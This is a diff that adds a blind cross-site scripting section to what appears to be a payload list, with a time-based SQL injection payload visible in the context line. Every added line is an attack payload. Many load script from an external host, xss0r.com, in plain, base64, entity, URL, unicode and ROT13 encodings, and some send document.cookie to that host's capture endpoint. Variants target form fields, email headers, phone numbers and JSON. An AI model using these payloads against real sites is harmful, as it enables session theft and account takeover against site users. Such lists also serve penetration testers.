@@ -31,3 +31,48 @@ the0'XOR(if(now()=sysdate(),sleep(1),0))XOR'Z
 
 
 
+
+
+
+
+Blind XSS:
+==========
+'"><script src=https://xss0r.com/c/lostsec></script>
+<img src="data:text/html;base64,PHNjcmlwdCBzcmM9Imh0dHBzOi8veHNzMHIuY29tL2MvbG9zdHNlYyI+">
+&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x20;&#x73;&#x72;&#x63;&#x3D;&#x68;&#x74;&#x74;&#x70;&#x73;&#x3A;&#x2F;&#x2F;&#x78;&#x73;&#x73;&#x30;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x63;&#x2F;&#x6C;&#x6F;&#x73;&#x74;&#x73;&#x65;&#x63;&#x3E;
+ac8adfc7d8119c9fa49312902dfa4969d31bca4db9911cb26e6e22e7288ab76a
+<iframe src="javascript:eval(atob('PHNjcmlwdCBzcmM9Imh0dHBzOi8veHNzMHIuY29tL2MvbG9zdHNlYyI+'))"></iframe>
+<img src="http://lostsec.xss0r.com">
+"><svg/onload=fetch('https://xss0r.com/c/lostsec')>
+<img src=x onerror="eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))">
+<iframe src="data:text/html;base64,cnVuU2V0VGltZW91dCgoKSA9PiB7YWxlcnQoZG9jdW1lbnQuZG9tYWluKX0sMTAwMCk="></iframe>
+<input type="hidden" name="xss" value='"><svg/onload=eval(atob("YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="))>'>
+"\"><script src=https://xss0r.com/c/lostsec></script>"
+<img src="http://xss0r.com/capture?data="+document.domain>
+<img src="data:text/html;base64,Ij48c2NyaXB0IHNyYz1odHRwczovL3hzczByLmNvbS9jL2xvc3RzZWM+PC9zY3JpcHQ+">
+&#x22;&#x3e;&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x20;&#x73;&#x72;&#x63;&#x3d;&#x68;&#x74;&#x74;&#x70;&#x73;&#x3a;&#x2f;&#x2f;&#x78;&#x73;&#x73;&#x30;&#x72;&#x2e;&#x63;&#x6f;&#x6d;&#x2f;&#x63;&#x2f;&#x6c;&#x6f;&#x73;&#x74;&#x73;&#x65;&#x63;&#x3e;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;
+%22%3E%3Cscript%20src%3Dhttps%3A%2F%2Fxss0r.com%2Fc%2Flostsec%3E%3C%2Fscript%3E
+\u0022\u003E\u003C\u0073\u0063\u0072\u0069\u0070\u0074\u0020\u0073\u0072\u0063\u003D\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u0078\u0073\u0073\u0030\u0072\u002E\u0063\u006F\u006D\u002F\u0063\u002F\u006C\u006F\u0073\u0074\u0073\u0065\u0063\u003E\u003C\u002F\u0073\u0063\u0072\u0069\u0070\u0074\u003E
+"> <fpevcg fpe=uggcf://kff0e.pbz/p/ybfgrfp> </fpevcg>
+8d0609315e85a990fa8dc616427bd1c4
+<script>eval(atob("PHNjcmlwdCBzcmM9Imh0dHBzOi8veHNzMHIuY29tL2MvbG9zdHNlYyI+PC9zY3JpcHQ+"))</script>
+<iframe src="javascript:eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))"></iframe>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))</script>
+<script>x=''; for(i=0;i<document.domain.length;i++)x+=String.fromCharCode(document.domain.charCodeAt(i)^1); alert(x);</script>
+<script>setTimeout('eval(atob("YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="))', 1000);</script>
+<img src="http://xss0r.com/capture?data="+document.cookie>
+<input type="text" name="username" value='"><script src=https://xss0r.com/c/lostsec></script>'>
+<input type="hidden" name="tracking" value='"><script src=https://xss0r.com/c/lostsec></script>'>
+<!-- '"><script src=https://xss0r.com/c/lostsec></script>' -->
+<meta http-equiv="refresh" content="0;url='javascript:eval(atob(\"PHNjcmlwdCBzcmM9Imh0dHBzOi8veHNzMHIuY29tL2MvbG9zdHNlYyI+PC9zY3JpcHQ+\"))'">
+<iframe src="javascript:eval(atob('PHNjcmlwdCBzcmM9Imh0dHBzOi8veHNzMHIuY29tL2MvbG9zdHNlYyI+PC9zY3JpcHQ+'))"></iframe>
+"><script src=https://xss0r.com/c/lostsec></script>@example.com
+From: "XSS Tester"><script src=https://xss0r.com/c/lostsec></script>" <test@example.com>
+Subject: Your Request"><script src=https://xss0r.com/c/lostsec></script>
++1-800-123-"'><script src=https://xss0r.com/c/lostsec></script>'
+<input type="tel" name="phone" value='"><script src=https://xss0r.com/c/lostsec></script>'>
+{
+  "phone": "\"><script src=https://xss0r.com/c/lostsec></script>"
+}
+<input type="text" name="voucher" value='"><script src=https://xss0r.com/c/lostsec></script>'>
+
